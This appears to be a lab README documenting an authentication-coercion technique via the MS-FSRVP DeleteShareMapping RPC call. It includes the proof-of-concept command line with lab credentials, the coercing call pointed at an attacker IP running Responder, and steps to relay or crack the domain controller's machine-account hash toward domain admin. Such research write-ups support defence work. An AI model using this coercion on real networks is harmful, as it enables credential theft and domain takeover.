# MS-FSRVP - Remote call to DeleteShareMapping (opnum 11)

## Summary

 - **Protocol**: [[MS-FSRVP]: File Server Remote VSS Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)

 - **Protocol UUID**: a8e0653c-2744-4389-a61d-7373df8b2292

 - **Protocol version**: 1.0

 - **SMB Named pipe**: `\\pipe\FssagentRpc`

 - **Function name**: [`DeleteShareMapping`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/1884e614-bdff-4e7f-a5d0-c27048a3f733)

 - **Function operation number**: `11`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\\pipe\FssagentRpc` and bind to the desired [`MS-FSRVP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b) protocol (with uuid `a8e0653c-2744-4389-a61d-7373df8b2292` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-FSRVP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\\pipe\FssagentRpc` This pipe is connected to the protocol [[MS-FSRVP]: File Server Remote VSS Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b) and allows to call RPC functions of this protocol. We will then call the remote [`DeleteShareMapping`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/1884e614-bdff-4e7f-a5d0-c27048a3f733) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
DeleteShareMapping('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
DWORD DeleteShareMapping(
         [in] handle_t hBinding,
         [in] GUID ShadowCopySetId,
         [in] GUID ShadowCopyId,
         [in] [string] LPWSTR ShareName);
```

## References

 - Documentation of protocol [MS-FSRVP]: File Server Remote VSS Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b

 - Documentation of function `DeleteShareMapping`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/1884e614-bdff-4e7f-a5d0-c27048a3f733